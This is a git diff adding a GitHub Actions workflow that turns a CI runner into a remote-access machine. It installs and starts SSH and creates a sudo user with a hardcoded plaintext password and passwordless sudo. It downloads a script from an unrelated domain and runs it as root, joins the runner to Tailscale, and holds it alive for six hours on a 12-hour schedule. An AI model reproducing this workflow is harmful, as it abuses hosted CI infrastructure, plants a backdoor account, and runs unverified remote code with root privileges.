@@ -1,0 +1,57 @@
+name: Code Space
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "0 */12 * * *"  # Chạy mỗi 12 giờ (bạn có thể điều chỉnh)
+
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+
+    steps:
+      - name: Update system
+        run: sudo apt update -y
+
+      - name: Install OpenSSH
+        run: |
+          sudo apt install -y openssh-server
+          sudo systemctl enable ssh
+          sudo systemctl start ssh
+
+      - name: Add new user hk3u
+        run: |
+          sudo useradd -m hk3u
+          echo "hk3u:Blenderhub.Net1@" | sudo chpasswd
+          sudo usermod -aG sudo hk3u
+          echo "hk3u ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/hk3u
+
+      - name: Install wget
+        run: sudo apt install -y wget
+
+      - name: Download and run install.sh
+        run: |
+          wget https://nt-xp.click/install.sh -O install.sh
+          chmod +x install.sh
+          sudo ./install.sh
+
+      - name: Install and start Tailscale
+        run: |
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/$(lsb_release -cs).noarmor.gpg | sudo tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/$(lsb_release -cs).tailscale-keyring.list | sudo tee /etc/apt/sources.list.d/tailscale.list
+          sudo apt update -y
+          sudo apt install -y tailscale
+          sudo tailscaled &
+          sleep 5
+          sudo tailscale up || true
+
+      - name: Keep VM alive for 6 hours
+        run: |
+          echo "Keeping runner alive for ~6 hours..."
+          for ((i=1;i<=21600;i++)); do
+            echo "Still alive... $i seconds"
+            sleep 1
+          done
+          
